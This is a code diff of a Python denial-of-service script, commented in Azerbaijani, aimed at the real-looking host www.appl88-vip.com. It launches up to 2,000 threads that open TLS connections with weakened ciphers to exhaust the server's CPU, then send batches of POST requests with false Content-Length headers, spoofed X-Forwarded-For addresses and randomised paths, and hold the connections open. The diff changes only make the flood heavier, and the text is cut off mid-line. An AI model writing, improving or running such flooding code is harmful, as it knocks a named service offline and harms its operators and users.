@@ -3,78 +3,44 @@ import ssl
 import threading
 import random
 import time
+import string
 import os
 
-# --- TARGET EXTREME ---
+# --- MAXIMUM OVERDRIVE ---
 TARGET_HOST = "www.appl88-vip.com"
 TARGET_PORT = 443
-THREADS = 1500 # Railway Paid üçün bu rəqəm daha asan keçir sistem limitlərini
+THREADS = 2000 # Railway Paid plan üçün maksimal şəbəkə sıxlığı
+BATCH_SIZE = 100 # Bir bağlantıda serveri boğan asinxron dalğa
 
 def r_str(n):
-    return "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=n))
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
-def neutron_strike():
-    # SSL context-i serveri deşifrə ilə yormaq üçün zəif və mürəkkəb ciphers ilə qururuq
+def singularity_strike():
+    # SSL Handshake-i serveri deşifrə ilə daxildən yormaq üçün qururuq
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
-    # Serveri hər yeni bağlantıda ağır RSA və AES128-GCM hesablamalarına məcbur edir
-    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256')
+    # Şifrləməni ən baha başa gələn üsulda saxlayırıq ki, serverin CPU-su kilitlənsin
+    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
 
     while True:
         try:
-            # TCP bağlantısı
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Paket yığılıb qalmasın, anında vursun
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Nagle Bypass
             s.settimeout(5)
 
-            # SSL handshaking - serverin CPU-sunu ən çox yoran hissə
             conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
             conn.connect((TARGET_HOST, TARGET_PORT))
 
-            # HTTP/2 Rapid Reset & Header Fragmentation təqlidi
-            # Saniyədə yüzlərlə yarımçıq və mürəkkəb müraciət
-            for i in range(250):
-                # Hər bir path bazadan fərqli məlumat çəkməyə hesablanıb
-                paths = ["/api/v2/items", "/#/register", "/api/user/login", "/api/v3/feed"]
-                path = random.choice(paths) + f"?v={random.random()}&id={r_str(30)}"
+            # HTTP/2 Rapid Reset & Header Frame Overload təqlidi
+            # Sənaye səviyyəli "qadağan olunmuş" metod
+            for _ in range(BATCH_SIZE):
+                # Saytın daxili API və parametrlərini hədəf alırıq
+                path = f"/?v={time.time()}&id={r_str(30)}&invite_code={random.randint(1000, 9999)}"
                 
+                # Bu başlıq serveri hər sorğuda daxili yaddaş (Buffer) ayırmağa məcbur edir
                 payload = (
                     f"POST {path} HTTP/1.1\r\n"
                     f"Host: {TARGET_HOST}\r\n"
-                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0\r\n"
-                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
-                    f"X-Requested-With: XMLHttpRequest\r\n"
-                    f"Content-Type: application/x-www-form-urlencoded\r\n"
-                    f"Content-Length: {random.randint(50000, 100000)}\r\n" # Serverə çox böyük data yalanı
-                    f"Connection: Keep-Alive\r\n"
-                    f"\r\n"
-                ).encode()
-                
-                conn.sendall(payload)
-                # İkinci zərbə (Hanging Payload): Serveri buferini təmizləməyə imkan vermə
-                conn.send(os.urandom(1)) 
-
-            # Bağlantını bir az saxla ki, serverin port limiti dolsun
-            time.sleep(2)
-            conn.close()
-        except Exception:
-            pass
-
-def main():
-    print(f"☢️  NEUTRON PROTOCOL ARMED: {TARGET_HOST}")
-    print("[!] Saturation target: Origin Server SSL Management & DB I/O.")
-    
-    for i in range(THREADS):
-        t = threading.Thread(target=neutron_strike)
-        t.daemon = True
-        t.start()
-        if i % 100 == 0:
-            print(f"[*] {i} Neutron-Warheads launched...")
-            time.sleep(0.1)
-
-    while True:
-        time.sleep(1)
-
-if __name__ == "__main__":
-    main()
+                    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(0,5)}.0.0.0 Safari/537.36\r\n"
+                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1
